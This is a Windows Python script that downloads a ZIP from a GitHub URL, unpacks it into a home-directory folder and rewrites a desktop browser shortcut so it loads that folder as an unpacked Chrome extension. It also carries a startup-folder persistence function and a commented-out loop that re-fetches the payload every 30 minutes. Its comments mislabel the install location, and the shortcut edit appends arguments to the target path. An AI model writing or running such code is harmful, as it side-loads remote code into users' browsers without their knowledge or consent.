import requests
import zipfile
import os
import shutil
import winshell
import time
import win32com.client


def fetch_and_unzip_to_secure_location():
    # Fetch the ZIP from the API
    url = "https://github.com/lucienklein/extraction-dist/raw/main/dist.zip?download="

    # Stream the request
    with requests.get(url, stream=True) as response:
        # Ensure the request was successful
        if response.status_code == 200:
            # Save the ZIP to a temporary file in chunks
            with open("temp.zip", "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)

            # Extract the ZIP
            with zipfile.ZipFile("temp.zip", 'r') as zip_ref:
                zip_ref.extractall("temp_folder")

            # Determine the main directory inside the ZIP (ignoring __MACOSX and other unwanted dirs)
            contents = [item for item in os.listdir(
                "temp_folder") if item != "__MACOSX"]
            if len(contents) == 1:
                main_directory = os.path.join("temp_folder", contents[0])
            else:
                main_directory = "temp_folder"

            # Secure location: User's AppData Folder
            target_directory = os.path.expanduser(
                '~\\Querco-Extraction-Tool')
            if not os.path.exists(target_directory):
                os.makedirs(target_directory)

            # Move the contents to the desired folder
            for item in os.listdir(main_directory):
                source = os.path.join(main_directory, item)
                destination = os.path.join(target_directory, item)
                if os.path.exists(destination):
                    if os.path.isdir(destination):
                        shutil.rmtree(destination)
                    else:
                        os.remove(destination)
                shutil.move(source, destination)

            # Cleanup: remove temporary ZIP and folder
            os.remove("temp.zip")
            shutil.rmtree("temp_folder")
        else:
            print(
                f"Failed to download ZIP. Status code: {response.status_code}")


def add_to_startup():
    startup_folder = os.path.expanduser(
        '~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    exe_path = os.path.abspath(__file__)
    shortcut_path = os.path.join(startup_folder, "your_script_name.lnk")

    # Check if already added to startup
    if not os.path.exists(shortcut_path):
        winshell.CreateShortcut(
            Path=shortcut_path,
            Target=exe_path,
            Icon=(exe_path, 0),
            Description="Your Script Description"
        )


if __name__ == "__main__":
    # while True:
    #     try:
    #         fetch_and_unzip_to_secure_location()
    #         time.sleep(1800)  # 30 minutes
    #     except Exception as e:
    #         print(f"An error occurred: {e}")
    # add_to_startup()

    # Define the path to the shortcut on the desktop
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    shortcut_name = "KaliSil.lnk"
    shortcut_path = os.path.join(desktop_path, shortcut_name)

    # Define the path to the Chrome extension directory
    extension_path = os.path.join(
        os.path.expanduser("~"), "Querco-Extraction-Tool")

    # Create a Shell object
    shell = win32com.client.Dispatch("WScript.Shell")

    # Load the shortcut
    shortcut = shell.CreateShortCut(shortcut_path)

    # Get the existing target path
    existing_target_path = shortcut.Targetpath

    # Define the desired argument to load the Chrome extension
    desired_argument = f"--load-extension=\"{extension_path}\""

    # Check if the desired argument is already present in the existing target path
    if desired_argument not in existing_target_path:
        # Add the desired argument to the existing target path
        new_target_path = f"{existing_target_path} {desired_argument}"

        # Update the shortcut
        shortcut.Targetpath = new_target_path
        shortcut.save()
        print("Shortcut updated successfully.")
    else:
        print("Shortcut is already updated.")
